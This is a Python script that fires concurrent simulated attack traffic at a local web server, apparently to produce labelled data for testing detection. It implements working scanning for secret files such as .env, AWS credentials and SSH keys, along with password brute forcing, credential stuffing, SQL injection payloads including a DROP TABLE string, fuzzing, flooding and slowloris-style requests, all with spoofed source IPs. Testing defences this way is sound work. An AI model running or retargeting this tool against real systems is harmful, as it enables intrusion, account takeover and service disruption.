import asyncio
import random
import httpx
import time
from datetime import datetime

BASE_URL = "http://127.0.0.1:8000"

# ENHANCED ATTACK ENDPOINTS (more sensitive)
ATTACK_ENDPOINTS = [
    "/login",
    "/admin",
    "/admin/dashboard",
    "/api/admin/users",
    "/config",
    "/reset-password",
    "/.git/config",
    "/backup/db.sql",
    "/.env",
    "/debug",
    "/api/private",
    "/api/internal",
    "/graphql",
    "/phpmyadmin"
]

# REALISTIC MALICIOUS USER AGENTS
MALICIOUS_AGENTS = {
    "scanner": [
        "sqlmap/1.7.11#dev",
        "Nmap Scripting Engine",
        "nikto/2.5.0",
        "w3af/1.6",
        "OpenVAS/9.0",
        "ZAP/2.12.0",
        "Masscan/1.3",
        "curl/7.68.0",
        "Wget/1.20.3",
        "python-requests/2.31.0",
    ],
    "botnet": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
    ],
    "brute": [
        "python-requests/2.28.1",
        "Go-http-client/1.1",
        "Hydra/9.3",
        "Medusa/2.2",
    ]
}

def get_malicious_headers(attacker_id, attack_type):
    """Generate headers that look like real attacks"""
    
    if attack_type == "scanner":
        user_agent = random.choice(MALICIOUS_AGENTS["scanner"])
    elif attack_type == "brute":
        user_agent = random.choice(MALICIOUS_AGENTS["brute"])
    else:
        user_agent = random.choice(MALICIOUS_AGENTS["botnet"])
    
    # Rotate IPs to simulate distributed attacks
    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    headers = {
        "User-Agent": user_agent,
        "X-Forwarded-For": fake_ip,
        "X-API-KEY": f"attacker-{attacker_id}",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "X-Simulated_Label":"attack"
    }
    
    # Add scanner-specific headers
    if attack_type == "scanner":
        headers["X-Scanner"] = random.choice(["sqlmap", "nikto", "nmap"])
        headers["X-Requested-With"] = "XMLHttpRequest"
    
    return headers

# 1. AGGRESSIVE SCANNER (enumerates everything)
async def aggressive_scanner(client, attacker_id):
    """Scanner that tries to find all vulnerabilities"""
    scanner_endpoints = ATTACK_ENDPOINTS + [
        "/wp-admin",
        "/wp-login.php",
        "/backup.zip",
        "/database.sql",
        "/api/v2/users",
        "/swagger.json",
        "/openapi.json",
        "/actuator/health",
        "/actuator/env",
        "/metrics",
        "/trace",
        "/dump",
        "/.aws/credentials",
        "/.ssh/id_rsa",
        "/password.txt",
        "/credentials.txt"
    ]
    
    for i in range(300):  # More requests
        endpoint = random.choice(scanner_endpoints)
        
        # Try different HTTP methods
        method = random.choice(["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"])
        
        try:
            if method == "GET":
                await client.get(
                    BASE_URL + endpoint,
                    headers=get_malicious_headers(attacker_id, "scanner"),
                    timeout=3
                )
            elif method == "POST":
                # Send random data to test for injection
                await client.post(
                    BASE_URL + endpoint,
                    json={"test": "' OR '1'='1", "id": "1; DROP TABLE users;--"},
                    headers=get_malicious_headers(attacker_id, "scanner"),
                    timeout=3
                )
            else:
                await client.request(
                    method,
                    BASE_URL + endpoint,
                    headers=get_malicious_headers(attacker_id, "scanner"),
                    timeout=3
                )
        except:
            pass
        
        # Very fast scanning
        await asyncio.sleep(random.uniform(0.01, 0.03))


# 2. INTENSE BRUTE FORCE (with credential stuffing)
async def intense_bruteforce(client, attacker_id):
    """Brute force attack with many credentials"""
    
    usernames = ["admin", "root", "administrator", "test", "user", "system", "oracle", "postgres"]
    common_passwords = [
        "admin123", "password123", "123456", "qwerty", "admin", 
        "root", "toor", "123456789", "password", "12345",
        "adminadmin", "passw0rd", "letmein", "welcome", "monkey",
        "dragon", "master", "sunshine", "princess", "shadow"
    ]
    
    for attempt in range(400):  # More attempts
        username = random.choice(usernames)
        password = random.choice(common_passwords)
        
        # Add random variation to avoid simple rate limiting
        if attempt % 20 == 0:
            await asyncio.sleep(0.05)  # Brief pause
        
        try:
            await client.post(
                BASE_URL + "/login",
                json={"username": username, "password": password},
                headers=get_malicious_headers(attacker_id, "brute"),
                timeout=2
            )
        except:
            pass
        
        # Very fast sequential attempts
        await asyncio.sleep(random.uniform(0.005, 0.02))


# 3. DDOS-STYLE BURST ATTACK
async def ddos_burst(client, attacker_id):
    """High-frequency burst attack on specific endpoint"""
    
    # Target specific resource-intensive endpoints
    targets = [
        "/api/data",
        "/api/search",
        "/api/products",
        "/api/users/me",
        "/health"
    ]
    
    endpoint = random.choice(targets)
    
    for _ in range(500):  # High volume
        try:
            await client.get(
                BASE_URL + endpoint,
                headers=get_malicious_headers(attacker_id, "botnet"),
                timeout=1
            )
        except:
            pass
        
        # Extremely fast (0-5ms between requests)
        await asyncio.sleep(random.uniform(0.001, 0.008))


# 4. SLOWLORIS KEEP-ALIVE (tie up connections)
async def slowloris_attack(client, attacker_id):
    """Slow attack that keeps connections open"""
    
    for _ in range(150):
        try:
            # Long timeout to simulate slowloris
            await client.get(
                BASE_URL + "/api/data",
                headers=get_malicious_headers(attacker_id, "botnet"),
                timeout=30  # Long timeout ties up connection
            )
        except:
            pass
        
        await asyncio.sleep(random.uniform(0.5, 2.0))


# 5. ENDPOINT FUZZING (high entropy)
async def endpoint_fuzzer(client, attacker_id):
    """Fuzzing to discover hidden endpoints"""
    
    common_paths = [
        "/api", "/v1", "/v2", "/v3", "/internal", "/private", 
        "/secret", "/hidden", "/debug", "/test", "/dev", 
        "/stage", "/backup", "/old", "/temp", "/tmp"
    ]
    
    for _ in range(250):
        # Generate random paths
        if random.random() > 0.5:
            endpoint = random.choice(common_paths) + random.choice(["", "/", "/admin", "/config"])
        else:
            endpoint = f"/{random.choice(['api', 'admin', 'internal'])}/{random.randint(1,999)}"
        
        try:
            await client.get(
                BASE_URL + endpoint,
                headers=get_malicious_headers(attacker_id, "scanner"),
                timeout=2
            )
        except:
            pass
        
        await asyncio.sleep(random.uniform(0.005, 0.02))


# 6. CREDENTIAL REUSE (multiple accounts)
async def credential_reuse(client, attacker_id):
    """Try same credentials across multiple endpoints"""
    
    stolen_creds = [
        ("user123", "pass123"),
        ("admin", "admin123"),
        ("test", "test123"),
        ("alice", "alice2024"),
        ("bob", "bob2024"),
    ]
    
    auth_endpoints = ["/login", "/auth", "/api/auth", "/token", "/oauth/token"]
    
    for _ in range(300):
        username, password = random.choice(stolen_creds)
        endpoint = random.choice(auth_endpoints)
        
        try:
            await client.post(
                BASE_URL + endpoint,
                json={"username": username, "password": password},
                headers=get_malicious_headers(attacker_id, "brute"),
                timeout=2
            )
        except:
            pass
        
        await asyncio.sleep(random.uniform(0.01, 0.03))


# 7. SQL INJECTION ATTEMPTS
async def sql_injection(client, attacker_id):
    """SQL injection payload delivery"""
    
    sql_payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users--",
        "admin'--",
        "1' OR '1' = '1",
        "' OR 1=1--",
        "'; SELECT * FROM passwords--",
    ]
    
    for _ in range(200):
        payload = random.choice(sql_payloads)
        
        try:
            # Try injection in different places
            if random.random() > 0.5:
                # Query parameter
                await client.get(
                    BASE_URL + f"/api/search?q={payload}",
                    headers=get_malicious_headers(attacker_id, "scanner"),
                    timeout=2
                )
            else:
                # POST body
                await client.post(
                    BASE_URL + "/login",
                    json={"username": payload, "password": payload},
                    headers=get_malicious_headers(attacker_id, "scanner"),
                    timeout=2
                )
        except:
            pass
        
        await asyncio.sleep(random.uniform(0.005, 0.015))


# 8. RAPID FIRE (extreme)
async def rapid_fire(client, attacker_id):
    """Maximum speed attack on single endpoint"""
    
    for _ in range(800):
        try:
            await client.get(
                BASE_URL + "/api/test",
                headers=get_malicious_headers(attacker_id, "botnet"),
                timeout=0.5
            )
        except:
            pass
        
        # Almost no delay
        await asyncio.sleep(random.uniform(0.0001, 0.005))


# MAIN SIMULATION
async def main():
    print("🔥 Starting AGGRESSIVE ATTACK SIMULATION 🔥")
    print("=" * 60)
    
    async with httpx.AsyncClient(timeout=5, limits=httpx.Limits(max_keepalive_connections=100, max_connections=200)) as client:
        
        tasks = []
        
        # Attack distribution (all high-intensity)
        attack_configs = [
            (aggressive_scanner, 8, "🔴 Aggressive Scanner"),
            (intense_bruteforce, 10, "🔴 Intense Brute Force"),
            (ddos_burst, 6, "🔴 DDoS Burst"),
            (slowloris_attack, 4, "⚠️ Slowloris"),
            (endpoint_fuzzer, 6, "🔴 Endpoint Fuzzer"),
            (credential_reuse, 8, "🔴 Credential Reuse"),
            (sql_injection, 6, "🔴 SQL Injection"),
            (rapid_fire, 10, "⚡ Rapid Fire"),
        ]
        
        total_attacks = 0
        for attack_func, count, label in attack_configs:
            print(f"{label}: {count} instances")
            for i in range(count):
                tasks.append(attack_func(client, i))
                total_attacks += 1
        
        print("=" * 60)
        print(f"🚀 Launching {total_attacks} concurrent attack instances...")
        print("💥 Press Ctrl+C to stop")
        print("=" * 60)
        
        start = time.time()
        
        # Run with timeout to see results
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print("\n⚠️ Simulation interrupted")
        
        elapsed = time.time() - start
        print(f"\n✅ Attack simulation completed in {elapsed:.2f}s")
        print(f"📊 Total requests sent: {total_attacks * 300} (approx)")

if __name__ == "__main__":
    asyncio.run(main())